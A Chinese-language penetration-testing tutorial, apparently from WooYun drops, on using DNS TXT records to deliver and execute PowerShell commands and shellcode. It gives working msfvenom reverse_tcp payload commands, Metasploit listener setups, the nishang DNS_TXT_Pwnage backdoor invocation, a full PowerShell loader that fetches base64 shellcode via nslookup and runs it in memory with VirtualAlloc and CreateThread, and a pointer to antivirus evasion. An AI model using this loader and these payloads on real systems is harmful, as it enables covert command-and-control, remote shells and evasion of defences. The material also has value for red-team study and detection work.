# 通过DNS TXT记录执行powershell

0x00简介
======

* * *

DNS TXT记录一般用来记录某个主机名或者域名设置的说明，在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。本篇文章主要介绍如何使用[nishang](https://github.com/samratashok/nishang)通过创建TXT记录执行powershell脚本。当然，首先你要有一个域名。

0x01创建TXT记录
===========

* * *

这里需要使用nishang中的一个脚本[OUT-DnsTxt](https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1)。

1.常见命令
------

因为常见命令比较短，所以可以直接添加到TXT记录中，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/cb635f4d7b2fbb68cc2b4d451fd2fd3297979c31.jpg)

现在查看一下TXT记录：

![Alt text](http://drops.javaweb.org/uploads/images/c3d6dfe65eed896558d9805e77ceb893c69fe7e9.jpg)

可以看到记录已经成功添加了。

2.脚本
----

由于TXT记录长度限制为255,如果要添加一个脚本到记录里面，需要添加多个TXT记录。下面是一个例子,自己写了一个PSH脚本：

```
function Get-User
{
<#
.SYNOPSIS
Script to generate DNS TXT for a test.
.DESCRIPTION
Use this script to get user information. to be more big.. more big... big..Do one thing at a time, and do well.Keep on going never give up.
.EXAMPLE
PS > Get-User
#>    

[CmdletBinding()]
Param ()
    net user
}

```

使用Out-Dnstxt进行转换：

```
PS F:\DNS> . .\Out-DnsTxt.ps1
PS F:\DNS> Out-DnsTxt -DataToEncode .\Get-User.ps1
You need to create 2 TXT records.
All TXT Records written to F:\DNS\encodedtxt.txt

```

由于这个脚本比较小，所以只生产两行：

![Alt text](http://drops.javaweb.org/uploads/images/e3b68059034c6c0457bae9776ac6756bf445a350.jpg)

可以分别将这两行内容按顺序添加到 1.ps.domain.com到2.ps.domian.com中如下图：

![Alt text](http://drops.javaweb.org/uploads/images/1731ee80d007bdcc85a250c192640223eb93ce1a.jpg)

查看TXT，可以看到内容都已经添加好了：

![Alt text](http://drops.javaweb.org/uploads/images/8bc20c45292615fa6fdbd3ce8310ee01ae958207.jpg)

0x02 执行Powershell
=================

* * *

添加完了TXT记录以后，通过[DNS_TXT_Pwnage.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Backdoors/DNS_TXT_Pwnage.ps1)来执行这些脚本。

> DNS_TXT_Pwnage.ps1 是一个通过DNS TXT来接收命令或者脚本的一个后门脚本

这里还需要添加两条记录，strat与stop，具体如下图：

![Alt text](http://drops.javaweb.org/uploads/images/749079129f3b1740d42ceda0cbd97a915ee11fc1.jpg)

1.执行命令
------

```
PS F:\DNS> . .\DNS_TXT_Pwnage.ps1
PS F:\DNS> DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring start -commanddomain command.evi1cg.me -psstring test -psdomain xxx.evi1cg.me -
Subdomains 1 -StopString stop

```

> 解释一下参数：

*   **startdomain**为创建的_start.domain_，返回一个字符串；
*   **cmdstring**为任意输入的字符串；
*   **commanddomain**为创建的执行命令TXT记录的域名；
*   **psstring**为任意输入的字符串；
*   **psdomain**为创建的执行脚本TXT记录的域名或子域名 ；
*   **Subdomains**为执行脚本创建TXT记录的个数（如1.2中创建的脚本，该值为2）；
*   **StopString**为任意输入的字符串。

此处比较重要的参数为**startdomain**，他会与我们输入的cmdstring以及psstring进行比较，如果与cmdstring值相等，则执行**commanddomain**即命令，与psstring相等则执行**psdomain**即脚本。

上面为执行命令，所以cmdstring值我们输入为start，与start.evi1cg.me的txt记录值相等，psstring随便输入，不留空就行。执行结果如下图：

![Alt text](http://drops.javaweb.org/uploads/images/aed46d02fd8a68ca2f204afa63367c20610decac.jpg)

我们可以通过修改command.domain的TXT值来执行不同的命令。比如Get-Host：

![Alt text](http://drops.javaweb.org/uploads/images/3abc9d3226291b93b12b1d08307b940e3302d43e.jpg)

2.执行脚本
------

```
PS F:\DNS> . .\DNS_TXT_Pwnage.ps1
PS F:\DNS> DNS_TXT_Pwnage -startdomain start.evi1cg.me -cmdstring bulabula -commanddomain command.evi1cg.me -psstring start -psdomain ps.evi1
cg.me -Arguments Get-User -Subdomains 2 -StopString stop

```

这里要注意，psstring的值为start，与start.domain的TXT记录相同，cmdstring为任意字符串。效果如下图：

![Alt text](http://drops.javaweb.org/uploads/images/dcf40ec9b538bf5e6771ee36ef8ec138d41ace22.jpg)

> 这里多一个参数**Arguments**，要写明要执行的函数名，测试发现，在脚本中含有中文时会失败。对于需要带参数的脚本可以修改脚本指定参数值。

0x03 执行Shellcode
================

* * *

可以通过TXT记录执行shellcode，首先，我们使用msf生成一个powershell的shellcode:

```
☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp -f powershell LHOST=x.x.x.x LPORT=8887 > pspayload.txt

```

使用Out-DnsTxt对生成的文件进行转换：

```
PS F:\DNS> Out-DnsTxt -DataToEncode .\pspayload.txt
You need to create 3 TXT records.
All TXT Records written to F:\DNS\encodedtxt.txt

```

然后将以上记录分别添加到TXT记录中，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/bc339674bde592c49e59646eefa825f678f75fdf.jpg)

测试使用的32位win7系统，使用msf开启监听：

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 8887
LPORT => 8887
msf exploit(handler) > set LHOST x.x.x.x
LHOST => x.x.x.x
msf exploit(handler) > exploit    

[*] Started reverse handler on x.x.x.x:8887
[*] Starting the payload handler...

```

我们还需要一个获取TXT记录并执行的脚本，这里我改了一个脚本：

```
function Execute-Code
{
<#
.PARAMETER Shelldomain
The domain (or subdomain) whose subbdomain's TXT records would hold shellcode.
.PARAMETER subdomains
The number of subdomains which would be used to provide shellcode from their TXT records.
 .PARAMETER AUTHNS
Authoritative Name Server for the domains.
.EXAMPLE
PS > Execute-Code
The payload will ask for all required options.
.EXAMPLE
PS > Execute-Code -Shelldomain 32.alteredsecurity.com -SubDomains 5 -AUTHNS f1g1ns2.dnspod.net.
Use above from non-interactive shell.
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Shelldomain,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Subdomains,     
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $AUTHNS
    )
    function Get-ShellCode
    {
        Param(
            [Parameter()]
            [String]
            $Shelldomain
        )
        $i = 1
        while ($i -le $subdomains)
        {
            $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$Shelldomain $AUTHNS") 
            $temp = $getcommand | select-string -pattern "`""
            $tmp1 = ""
            $tmp1 = $tmp1 + $temp
            $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
            $i++
        }
        #$encdata = ""
        $dec = [System.Convert]::FromBase64String($encdata)
        $ms = New-Object System.IO.MemoryStream
        $ms.Write($dec, 0, $dec.Length)
        $ms.Seek(0,0) | Out-Null
        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
        $sr = New-Object System.IO.StreamReader($cs)
        $sc = $sr.readtoend()
        return $sc
    }
    $Shell = (Get-ShellCode $Shelldomain)
    #Remove unrequired things from msf shellcode
    $tmp = $Shell -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
    [Byte[]]$sc = $tmp -split ','
    #Code Execution logic
    $code = @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@
    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
    $size = 0x1000 
    if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
    $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)}
    Try {
        $winFunc::CreateThread(0,0,$x,0,0,0)
        sleep 100000
        }
    Catch
    {
    [system.exception]
    "caught a system exception"
    }
}

```

> 参数说明，**Shelldomain **为创建txt记录的域名或子域名;**subdomains**为创建TXT域名的个数，如上面所创建的为3;**AUTHNS **为域的权威名称服务器，如我使用的狗爹，所以AUTHNS为f1g1ns2.dnspod.net

在32位win7上执行：

```
PS C:\Users\evi1cg\Desktop> . .\Execute-Code.ps1
PS C:\Users\evi1cg\Desktop> Execute-Code -Shelldomain 32.evi1cg.me -subdomains 3 -AUTHNS f1g1ns2.dnspod.net

```

成功获取meterpreter会话：

![Alt text](http://drops.javaweb.org/uploads/images/c73eef6506e9cc1b3c7968793a7f496d5fcb27e7.jpg)

64位的请自行修改payload及脚本。

0x04 补充
=======

* * *

Metasploit中已经含有此脚本[dns_txt_query_exec.rb](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/payloads/singles/windows/dns_txt_query_exec.rb)，此脚本查询TXT记录的顺序为a.domain,b.domain...,下面是一个示例，首先生成payload:

```
☁  ~  sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=103.238.225.222 LPORT=8887 -e x86/alpha_mixed Bufferregister=EDI -f raw > reverse.txt

```

使用下面的脚本对该文件进行切割：

```
#!/usr/bin/env python
#coding=utf-8
def txt(string,length):
    return [string[x:x+length] for x in range(0,len(string),length)]
with open('out.txt','w+') as f:
    line = open('reverse.txt','r').read()
    line= txt(line,255)
    for txts in line:
        f.writelines(txts+'\n\n\n\n')

```

输出如下：

![Alt text](http://drops.javaweb.org/uploads/images/e31a289bfe402d4bd7032fba8a96ea14364a5470.jpg)

将这三行分别添加到a.domain,b.domain,c.domain的TXT记录中:

![Alt text](http://drops.javaweb.org/uploads/images/aa4d75411a5dd8451d0f2e43cb3dd1a8539538c5.jpg)

生成exe:

```
☁  ~  sudo msfvenom -p windows/dns_txt_query_exec DNSZONE=evi1cg.me -f exe > test.exe

```

msf开启监听：

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST x.x.x.x
LHOST => x.x.x.x
msf exploit(handler) > set LPORT 8887
LPORT => 8887
msf exploit(handler) > exploit

```

运行exe，获得meterpreter:

![Alt text](http://drops.javaweb.org/uploads/images/9b2b7c1689f968c5ae75c5ae7b11910c6894169c.jpg)

至于免杀，可以直接生成c格式的shellcode,然后按照[打造免杀payload](http://zone.wooyun.org/content/22796)来做。

0x05 小结
=======

* * *

本文主要介绍一种执行命令的方式以及nishang的脚本使用，希望能对大家有帮助。

本文由evi1cg原创并首发于乌云drops，转载请注明